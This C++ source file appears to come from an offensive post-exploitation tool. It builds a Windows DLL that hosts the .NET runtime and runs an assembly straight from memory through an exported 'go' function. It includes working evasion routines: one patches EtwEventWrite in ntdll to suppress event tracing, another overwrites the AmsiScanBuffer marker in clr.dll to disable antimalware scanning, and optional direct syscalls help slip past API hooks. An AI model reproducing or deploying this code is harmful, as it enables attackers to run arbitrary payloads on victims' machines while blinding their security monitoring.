#include "DotnetExec.hpp"

#ifdef _WIN32

#ifdef DW_ENABLE_DOTNET_SYSCALLS
#include "syscall.hpp"
#endif

#include <shellapi.h>
#include <shlwapi.h>

#include <cstdio>
#include <cstring>
#include <new>
#include <string>
#include <vector>

#pragma comment(lib, "Shlwapi.lib")

using namespace mscorlib;

typedef HRESULT(WINAPI *funcCLRCreateInstance)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);
typedef HRESULT(__stdcall* CLRIdentityManagerProc)(REFIID, IUnknown**);

static const GUID xCLSID_CLRMetaHost = { 0x9280188d, 0x0e8e, 0x4867, {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde} };
static const GUID xCLSID_ICLRRuntimeHost = { 0x90F1A06E, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02} };
static const GUID xCLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e} };

#define ERROR_INIT_CLR_1 1
#define ERROR_INIT_CLR_2 2
#define ERROR_INIT_CLR_3 3
#define ERROR_INIT_CLR_4 4
#define ERROR_INIT_CLR_5 5
#define ERROR_INIT_CLR_6 6
#define ERROR_INIT_CLR_7 7
#define ERROR_INIT_CLR_8 8

#define ERROR_LOAD_ASSEMLBY_1 11
#define ERROR_LOAD_ASSEMLBY_2 12
#define ERROR_LOAD_ASSEMLBY_3 13
#define ERROR_LOAD_ASSEMLBY_4 14
#define ERROR_LOAD_ASSEMLBY_5 15

#define ERROR_INVOKE_METHOD_11 31
#define ERROR_INVOKE_METHOD_12 32
#define ERROR_INVOKE_METHOD_13 33
#define ERROR_INVOKE_METHOD_14 34
#define ERROR_INVOKE_METHOD_15 35

#ifdef DW_GOODCLR_TRACE
#define DW_TRACE(fmt, ...) do { printf("[goodClr] " fmt "\n", __VA_ARGS__); fflush(stdout); } while (0)
#else
#define DW_TRACE(fmt, ...) do { } while (0)
#endif

struct ClrContext
{
    ICLRMetaHost* metaHost = nullptr;
    ICLRRuntimeInfo* runtimeInfo = nullptr;
    ICLRRuntimeHost* clrRuntimeHost = nullptr;
    MyHostControl* hostControl = nullptr;
    ICorRuntimeHost* corHost = nullptr;
    IUnknownPtr appDomainThunk = nullptr;
    _AppDomainPtr defaultAppDomain = nullptr;
    TargetAssembly* targetAssembly = nullptr;

    void Cleanup()
    {
        if (defaultAppDomain)
            defaultAppDomain.Release();
        if (appDomainThunk)
            appDomainThunk.Release();
        if (corHost)
        {
            corHost->Release();
            corHost = nullptr;
        }
        if (clrRuntimeHost)
        {
            clrRuntimeHost->Release();
            clrRuntimeHost = nullptr;
        }
        if (hostControl)
        {
            hostControl->Release();
            hostControl = nullptr;
        }
        if (runtimeInfo)
        {
            runtimeInfo->Release();
            runtimeInfo = nullptr;
        }
        if (metaHost)
        {
            metaHost->Release();
            metaHost = nullptr;
        }
        if (targetAssembly)
        {
            delete targetAssembly;
            targetAssembly = nullptr;
        }
    }
};

static bool ProtectMemory(void* address, SIZE_T size, DWORD newProtect, DWORD* oldProtect)
{
#ifdef DW_ENABLE_DOTNET_SYSCALLS
    void* protectBase = address;
    SIZE_T protectSize = size;
    NTSTATUS status = Sw3NtProtectVirtualMemory_(GetCurrentProcess(), &protectBase, &protectSize, newProtect, oldProtect);
    DW_TRACE("ProtectMemory syscall status=0x%08lX base=%p size=%llu",
        static_cast<unsigned long>(status),
        protectBase,
        static_cast<unsigned long long>(protectSize));
    return status >= 0;
#else
    return ::VirtualProtect(address, size, newProtect, oldProtect) != FALSE;
#endif
}

static int PatchEtw()
{
#ifndef DW_ENABLE_DOTNET_ETW_PATCH
    return 0;
#else
    DW_TRACE("%s", "PatchEtw start");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll)
    {
        DW_TRACE("%s", "PatchEtw failed: ntdll.dll not loaded");
        return -1;
    }

    void* eventWrite = reinterpret_cast<void*>(GetProcAddress(ntdll, "EtwEventWrite"));
    if (!eventWrite)
    {
        DW_TRACE("%s", "PatchEtw failed: EtwEventWrite not found");
        return -1;
    }

    DW_TRACE("PatchEtw EtwEventWrite=%p", eventWrite);

    HANDLE process = GetCurrentProcess();
    DWORD oldProtect = 0;
    SIZE_T protectSize = 1024;

    bool protectOk = ProtectMemory(eventWrite, protectSize, PAGE_READWRITE, &oldProtect);
    DW_TRACE("PatchEtw protect rw ok=%d old=0x%08lX",
        protectOk ? 1 : 0,
        static_cast<unsigned long>(oldProtect));
    if (!protectOk)
        return -1;

#if defined(_M_ARM64) || defined(__aarch64__)
    char patch[] = "\x00\x00\x80\x52\xc0\x03\x5f\xd6"; // mov w0, #0; ret
    const int patchSize = 8;
#elif defined(_WIN64)
    char patch[] = "\x48\x33\xc0\xc3"; // xor rax, rax; ret
    const int patchSize = 4;
#else
    char patch[] = "\x33\xc0\xc2\x14\x00"; // xor eax, eax; ret 14
    const int patchSize = 5;
#endif

    WriteProcessMemory(process, eventWrite, patch, patchSize, nullptr);
    FlushInstructionCache(process, eventWrite, patchSize);

    DWORD unusedProtect = 0;
    protectOk = ProtectMemory(eventWrite, protectSize, oldProtect, &unusedProtect);
    DW_TRACE("PatchEtw restore ok=%d", protectOk ? 1 : 0);
    DW_TRACE("%s", "PatchEtw done");

    return protectOk ? 0 : -1;
#endif
}

static bool GetModuleRange(HMODULE moduleBase, BYTE** moduleStart, SIZE_T* moduleSize)
{
    if (!moduleBase || !moduleStart || !moduleSize)
        return false;

    BYTE* base = reinterpret_cast<BYTE*>(moduleBase);
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return false;

    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return false;

    *moduleStart = base;
    *moduleSize = nt->OptionalHeader.SizeOfImage;
    return true;
}

static BYTE* FindBytes(BYTE* start, SIZE_T size, const std::vector<BYTE>& pattern)
{
    if (!start || size == 0 || pattern.empty() || pattern.size() > size)
        return nullptr;

    BYTE* end = start + size - pattern.size();
    for (BYTE* p = start; p <= end; p++)
    {
        if (memcmp(p, pattern.data(), pattern.size()) == 0)
            return p;
    }

    return nullptr;
}

static bool IsReadablePage(DWORD protect)
{
    if (protect & PAGE_GUARD)
        return false;

    if (protect & PAGE_NOACCESS)
        return false;

    DWORD baseProtect = protect & 0xff;
    switch (baseProtect)
    {
    case PAGE_READONLY:
    case PAGE_READWRITE:
    case PAGE_WRITECOPY:
    case PAGE_EXECUTE_READ:
    case PAGE_EXECUTE_READWRITE:
    case PAGE_EXECUTE_WRITECOPY:
        return true;
    default:
        return false;
    }
}

static BYTE* FindBytesInReadableMemory(BYTE* start, SIZE_T size, const std::vector<BYTE>& pattern)
{
    if (!start || size == 0 || pattern.empty())
        return nullptr;

    BYTE* moduleEnd = start + size;
    BYTE* current = start;

    while (current < moduleEnd)
    {
        MEMORY_BASIC_INFORMATION mbi{};
        if (!VirtualQuery(current, &mbi, sizeof(mbi)))
            break;

        BYTE* regionBase = reinterpret_cast<BYTE*>(mbi.BaseAddress);
        BYTE* regionEnd = regionBase + mbi.RegionSize;
        if (regionEnd > moduleEnd)
            regionEnd = moduleEnd;

        BYTE* scanStart = current;
        if (scanStart < regionBase)
            scanStart = regionBase;

        if (mbi.State == MEM_COMMIT && IsReadablePage(mbi.Protect) && scanStart < regionEnd)
        {
            BYTE* found = FindBytes(scanStart, static_cast<SIZE_T>(regionEnd - scanStart), pattern);
            if (found)
                return found;
        }

        current = regionEnd;
    }

    return nullptr;
}

static int PatchAmsiClr()
{
#ifndef DW_ENABLE_DOTNET_AMSI_PATCH
    return 0;
#else
    DW_TRACE("%s", "PatchAmsiClr start");

    HMODULE module = LoadLibraryA("clr.dll");
    if (!module)
    {
        DW_TRACE("%s", "PatchAmsiClr failed: clr.dll not loaded");
        return -1;
    }

    BYTE* moduleStart = nullptr;
    SIZE_T moduleSize = 0;
    if (!GetModuleRange(module, &moduleStart, &moduleSize))
    {
        DW_TRACE("%s", "PatchAmsiClr failed: invalid clr.dll range");
        return -1;
    }

    DW_TRACE("PatchAmsiClr clr range=%p size=%llu", moduleStart, static_cast<unsigned long long>(moduleSize));

    const std::vector<BYTE> amsiScanBuffer = {
        0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61,
        0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72
    };

    void* found = FindBytesInReadableMemory(moduleStart, moduleSize, amsiScanBuffer);
    if (!found)
    {
        DW_TRACE("%s", "PatchAmsiClr skipped: marker not found");
        return -1;
    }

    DW_TRACE("PatchAmsiClr marker=%p", found);

    char patch[] = "AAAAAAAAAAAAAA";
    HANDLE process = GetCurrentProcess();
    DWORD oldProtect = 0;
    SIZE_T protectSize = 1024;

    bool protectOk = ProtectMemory(found, protectSize, PAGE_READWRITE, &oldProtect);
    DW_TRACE("PatchAmsiClr protect rw ok=%d old=0x%08lX",
        protectOk ? 1 : 0,
        static_cast<unsigned long>(oldProtect));
    if (!protectOk)
        return -1;

    WriteProcessMemory(process, found, patch, 14, nullptr);
    FlushInstructionCache(process, found, 14);

    DWORD unusedProtect = 0;
    protectOk = ProtectMemory(found, protectSize, oldProtect, &unusedProtect);
    DW_TRACE("PatchAmsiClr restore ok=%d", protectOk ? 1 : 0);
    DW_TRACE("%s", "PatchAmsiClr done");

    return protectOk ? 0 : -1;
#endif
}

static int InitClr(ClrContext& clr)
{
    DW_TRACE("%s", "InitClr start");

    int patchRet = PatchEtw();
    DW_TRACE("InitClr PatchEtw ret=%d", patchRet);

    HMODULE mscoree = LoadLibraryA("mscoree.dll");
    DW_TRACE("InitClr mscoree=%p", mscoree);
    if (!mscoree)
        return ERROR_INIT_CLR_1;

    auto clrCreateInstance = reinterpret_cast<funcCLRCreateInstance>(GetProcAddress(mscoree, "CLRCreateInstance"));
    DW_TRACE("InitClr CLRCreateInstance=%p", clrCreateInstance);
    if (!clrCreateInstance)
        return ERROR_INIT_CLR_1;

    HRESULT hr = clrCreateInstance(xCLSID_CLRMetaHost, IID_PPV_ARGS(&clr.metaHost));
    DW_TRACE("InitClr CLRCreateInstance hr=0x%08lX metaHost=%p",
        static_cast<unsigned long>(hr),
        clr.metaHost);
    if (FAILED(hr))
        return ERROR_INIT_CLR_1;

    hr = clr.metaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&clr.runtimeInfo));
    DW_TRACE("InitClr GetRuntime hr=0x%08lX runtimeInfo=%p",
        static_cast<unsigned long>(hr),
        clr.runtimeInfo);
    if (FAILED(hr))
        return ERROR_INIT_CLR_2;

    BOOL loadable = FALSE;
    hr = clr.runtimeInfo->IsLoadable(&loadable);
    DW_TRACE("InitClr IsLoadable hr=0x%08lX loadable=%d",
        static_cast<unsigned long>(hr),
        loadable);
    if (FAILED(hr) || !loadable)
        return ERROR_INIT_CLR_3;

    hr = clr.runtimeInfo->GetInterface(xCLSID_ICLRRuntimeHost, IID_PPV_ARGS(&clr.clrRuntimeHost));
    DW_TRACE("InitClr GetInterface ICLRRuntimeHost hr=0x%08lX host=%p",
        static_cast<unsigned long>(hr),
        clr.clrRuntimeHost);
    if (FAILED(hr))
        return ERROR_INIT_CLR_4;

    clr.hostControl = new (std::nothrow) MyHostControl();
    DW_TRACE("InitClr hostControl=%p", clr.hostControl);
    if (!clr.hostControl)
        return ERROR_INIT_CLR_4;

    hr = clr.clrRuntimeHost->SetHostControl(clr.hostControl);
    DW_TRACE("InitClr SetHostControl hr=0x%08lX", static_cast<unsigned long>(hr));
    if (FAILED(hr))
        return ERROR_INIT_CLR_4;

    DW_TRACE("%s", "InitClr Start begin");
    hr = clr.clrRuntimeHost->Start();
    DW_TRACE("InitClr Start hr=0x%08lX", static_cast<unsigned long>(hr));
    if (FAILED(hr))
        return ERROR_INIT_CLR_5;

    hr = clr.runtimeInfo->GetInterface(xCLSID_CorRuntimeHost, __uuidof(ICorRuntimeHost), reinterpret_cast<void**>(&clr.corHost));
    DW_TRACE("InitClr GetInterface ICorRuntimeHost hr=0x%08lX corHost=%p",
        static_cast<unsigned long>(hr),
        clr.corHost);
    if (FAILED(hr))
        return ERROR_INIT_CLR_6;

    hr = clr.corHost->GetDefaultDomain(&clr.appDomainThunk);
    DW_TRACE("InitClr GetDefaultDomain hr=0x%08lX thunk=%p",
        static_cast<unsigned long>(hr),
        static_cast<IUnknown*>(clr.appDomainThunk));
    if (FAILED(hr))
        return ERROR_INIT_CLR_7;

    hr = clr.appDomainThunk->QueryInterface(IID_PPV_ARGS(&clr.defaultAppDomain));
    DW_TRACE("InitClr QueryInterface AppDomain hr=0x%08lX domain=%p",
        static_cast<unsigned long>(hr),
        static_cast<_AppDomain*>(clr.defaultAppDomain));
    if (FAILED(hr))
        return ERROR_INIT_CLR_8;

    patchRet = PatchAmsiClr();
    DW_TRACE("InitClr PatchAmsiClr ret=%d", patchRet);

    clr.targetAssembly = new (std::nothrow) TargetAssembly();
    DW_TRACE("InitClr targetAssembly=%p", clr.targetAssembly);
    if (!clr.targetAssembly)
        return ERROR_INIT_CLR_8;

    clr.hostControl->setTargetAssembly(clr.targetAssembly);
    DW_TRACE("%s", "InitClr done");
    return 0;
}

static int LoadManagedAssembly(ClrContext& clr, const std::string& data, _AssemblyPtr& assembly)
{
    DW_TRACE("LoadManagedAssembly start size=%llu", static_cast<unsigned long long>(data.size()));

    CLRIdentityManagerProc identityManagerProc = nullptr;
    HRESULT hr = clr.runtimeInfo->GetProcAddress("GetCLRIdentityManager", reinterpret_cast<void**>(&identityManagerProc));
    DW_TRACE("LoadManagedAssembly GetCLRIdentityManager hr=0x%08lX proc=%p",
        static_cast<unsigned long>(hr),
        reinterpret_cast<void*>(identityManagerProc));
    if (FAILED(hr) || !identityManagerProc)
        return ERROR_LOAD_ASSEMLBY_1;

    ICLRAssemblyIdentityManager* identityManager = nullptr;
    hr = identityManagerProc(__uuidof(ICLRAssemblyIdentityManager), reinterpret_cast<IUnknown**>(&identityManager));
    DW_TRACE("LoadManagedAssembly identityManager hr=0x%08lX manager=%p",
        static_cast<unsigned long>(hr),
        identityManager);
    if (FAILED(hr) || !identityManager)
        return ERROR_LOAD_ASSEMLBY_1;

    clr.hostControl->updateTargetAssembly(identityManager, data);
    LPWSTR identityBuffer = clr.hostControl->getAssemblyInfo();
    DW_TRACE("LoadManagedAssembly identityBuffer=%p", identityBuffer);
    if (!identityBuffer)
    {
        identityManager->Release();
        return ERROR_LOAD_ASSEMLBY_2;
    }

    BSTR assemblyName = SysAllocString(identityBuffer);
    if (!assemblyName)
    {
        identityManager->Release();
        return ERROR_LOAD_ASSEMLBY_2;
    }

    hr = clr.defaultAppDomain->Load_2(assemblyName, &assembly);
    DW_TRACE("LoadManagedAssembly Load_2 hr=0x%08lX assembly=%p",
        static_cast<unsigned long>(hr),
        static_cast<_Assembly*>(assembly));
    SysFreeString(assemblyName);
    identityManager->Release();

    if (FAILED(hr))
        return ERROR_LOAD_ASSEMLBY_3;

    return 0;
}

static HRESULT PutBstrElement(SAFEARRAY* array, LONG index, const wchar_t* value)
{
    BSTR item = SysAllocString(value);
    if (!item)
        return E_OUTOFMEMORY;

    HRESULT hr = SafeArrayPutElement(array, &index, item);
    SysFreeString(item);
    return hr;
}

static int InvokeEntryPoint(_AssemblyPtr& assembly, const std::wstring& argument)
{
    DW_TRACE("InvokeEntryPoint start argc-string-len=%llu", static_cast<unsigned long long>(argument.size()));

    if (!assembly)
        return ERROR_INVOKE_METHOD_11;

    _MethodInfoPtr methodInfo;
    HRESULT hr = assembly->get_EntryPoint(&methodInfo);
    DW_TRACE("InvokeEntryPoint get_EntryPoint hr=0x%08lX method=%p",
        static_cast<unsigned long>(hr),
        static_cast<_MethodInfo*>(methodInfo));
    if (FAILED(hr) || methodInfo == nullptr)
        return ERROR_INVOKE_METHOD_12;

    SAFEARRAY* invokeArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    if (!invokeArgs)
        return ERROR_INVOKE_METHOD_13;

    VARIANT stringArrayVariant;
    VariantInit(&stringArrayVariant);
    stringArrayVariant.vt = VT_ARRAY | VT_BSTR;

    LPWSTR* argv = nullptr;
    int argc = 0;

    if (!argument.empty())
        argv = CommandLineToArgvW(argument.c_str(), &argc);

    if (argv && argc > 0)
    {
        stringArrayVariant.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);
        if (!stringArrayVariant.parray)
        {
            LocalFree(argv);
            SafeArrayDestroy(invokeArgs);
            return ERROR_INVOKE_METHOD_13;
        }

        for (LONG i = 0; i < argc; i++)
        {
            hr = PutBstrElement(stringArrayVariant.parray, i, argv[i]);
            if (FAILED(hr))
            {
                LocalFree(argv);
                VariantClear(&stringArrayVariant);
                SafeArrayDestroy(invokeArgs);
                return ERROR_INVOKE_METHOD_13;
            }
        }
        LocalFree(argv);
    }
    else
    {
        if (argv)
            LocalFree(argv);

        stringArrayVariant.parray = SafeArrayCreateVector(VT_BSTR, 0, 1);
        if (!stringArrayVariant.parray)
        {
            SafeArrayDestroy(invokeArgs);
            return ERROR_INVOKE_METHOD_13;
        }

        hr = PutBstrElement(stringArrayVariant.parray, 0, L"");
        if (FAILED(hr))
        {
            VariantClear(&stringArrayVariant);
            SafeArrayDestroy(invokeArgs);
            return ERROR_INVOKE_METHOD_13;
        }
    }

    LONG argIndex = 0;
    hr = SafeArrayPutElement(invokeArgs, &argIndex, &stringArrayVariant);
    VariantClear(&stringArrayVariant);
    if (FAILED(hr))
    {
        SafeArrayDestroy(invokeArgs);
        return ERROR_INVOKE_METHOD_13;
    }

    VARIANT returnValue;
    VariantInit(&returnValue);

    VARIANT thisObject;
    VariantInit(&thisObject);
    thisObject.vt = VT_NULL;

    try
    {
        DW_TRACE("%s", "InvokeEntryPoint Invoke_3 begin");
        hr = methodInfo->Invoke_3(thisObject, invokeArgs, &returnValue);
        DW_TRACE("InvokeEntryPoint Invoke_3 hr=0x%08lX", static_cast<unsigned long>(hr));
    }
    catch (_com_error&)
    {
        SafeArrayDestroy(invokeArgs);
        VariantClear(&returnValue);
        VariantClear(&thisObject);
        return ERROR_INVOKE_METHOD_14;
    }
    catch (...)
    {
        SafeArrayDestroy(invokeArgs);
        VariantClear(&returnValue);
        VariantClear(&thisObject);
        return ERROR_INVOKE_METHOD_15;
    }

    SafeArrayDestroy(invokeArgs);
    VariantClear(&returnValue);
    VariantClear(&thisObject);

    if (FAILED(hr))
        return ERROR_INVOKE_METHOD_13;

    return 0;
}

static int LoadAssemblyInternal(void* ptr, int size, char* arg)
{
    DW_TRACE("LoadAssemblyInternal start ptr=%p size=%d arg=%p", ptr, size, arg);

    if (!ptr || size <= 0)
        return ERROR_LOAD_ASSEMLBY_2;

    std::string data(static_cast<char*>(ptr), static_cast<size_t>(size));
    std::wstring argument;
    if (arg)
        argument.assign(reinterpret_cast<wchar_t*>(arg));
    DW_TRACE("LoadAssemblyInternal argument-len=%llu", static_cast<unsigned long long>(argument.size()));

    ClrContext clr;
    int ret = InitClr(clr);
    DW_TRACE("LoadAssemblyInternal InitClr ret=%d", ret);
    if (ret != 0)
    {
        clr.Cleanup();
        return ret;
    }

    _AssemblyPtr assembly;
    ret = LoadManagedAssembly(clr, data, assembly);
    DW_TRACE("LoadAssemblyInternal LoadManagedAssembly ret=%d", ret);
    if (ret == 0)
    {
        ret = InvokeEntryPoint(assembly, argument);
        DW_TRACE("LoadAssemblyInternal InvokeEntryPoint ret=%d", ret);
    }

    if (assembly)
        assembly.Release();

    clr.Cleanup();
    DW_TRACE("LoadAssemblyInternal done ret=%d", ret);
    return ret;
}

extern "C" __declspec(dllexport) int go(void* data, int size, char* argument)
{
    DW_TRACE("go data=%p size=%d argument=%p", data, size, argument);
    int ret = LoadAssemblyInternal(data, size, argument);
    DW_TRACE("go ret=%d", ret);
    return ret;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    (void)hinstDLL;
    (void)fdwReason;
    (void)lpReserved;
    return TRUE;
}

#endif
